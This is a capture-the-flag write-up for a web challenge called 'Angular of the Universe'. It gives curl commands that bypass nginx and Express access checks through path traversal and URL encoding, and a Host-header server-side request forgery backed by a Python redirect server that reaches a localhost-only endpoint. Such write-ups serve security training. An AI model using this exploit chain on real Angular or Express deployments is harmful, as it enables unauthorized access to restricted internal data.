# Angular of the Universe
Category: Web

Flag1: Solves: 39, Score: 139  
Flag2: Solves: 34, Score: 149

> You know, everything has the angular.
A bread, you, me and even the universe.
Do you know the answer?

[http://universe.chal.ctf.westerns.tokyo](http://universe.chal.ctf.westerns.tokyo)


## Solution
For the first flag, we needed to bypass the nginx `location` directive:
```conf
location /debug {
    # IP address restriction.
    # TODO: add allowed IP addresses here
    allow 127.0.0.1;
    deny all;
  }
```
And after that the one in the express-server:
```ts
if (process.env.FLAG && req.path.includes('debug')) {
      return res.status(500).send('debug page is disabled in production env')
    }
```

We bypassed both checks by constructing a url with `//` because these characters seem to stop the route matching mechanism of angular/express and tell nginx that we are not entering `/debug` by traversing back with several `..`. So for now our exploit url is: `http://universe.chal.ctf.westerns.tokyo/debug/answer//../../a`

Luckily, the express request matchers seems to decode url-encoded characters before matching, so we can just substitute `d` with `%64` and bypass the includes.

When executing `curl --path-as-is -s http://universe.chal.ctf.westerns.tokyo/%64ebug/answer//../../a`, the flag can be found between several html-Tags.

For the second of the two flags we need to bypass our request ip, because the express server checks it before sending the flag:
```ts
server.get('/api/true-answer', (req, res) => {
    console.log(req.ips)
    if (req.ip.match(/127\.0\.0\.1/)) {
      res.json(`hello admin, this is true answer: ${process.env.FLAG2}`)
    } else {
      res.status(500).send('Access restricted!')
    }
  });
```

We solved this by changing the Host-Header in our Request, because Angular parses it as the Host for internal fetch Requests:
```
renderOptions.url =
      renderOptions.url || `${req.protocol}://${(req.get('host') || '')}${req.originalUrl}`;
```

With this we can exploit a fetch call on the debug Page:
```
this.service.getAnswer().subscribe((answer: string) => {
      this.answer = answer
    })
```

By excuting curl again pointing the host to our server running a Proxy script, we get the flag: `curl --path-as-is -s http://universe.chal.ctf.westerns.tokyo/%64ebug/answer//../../a -H "Host: example.com"`


## Proxy Server
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(301)
        self.send_header('Location', 'http://127.0.0.1/api/true-answer')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```

## Flag
`TWCTF{}`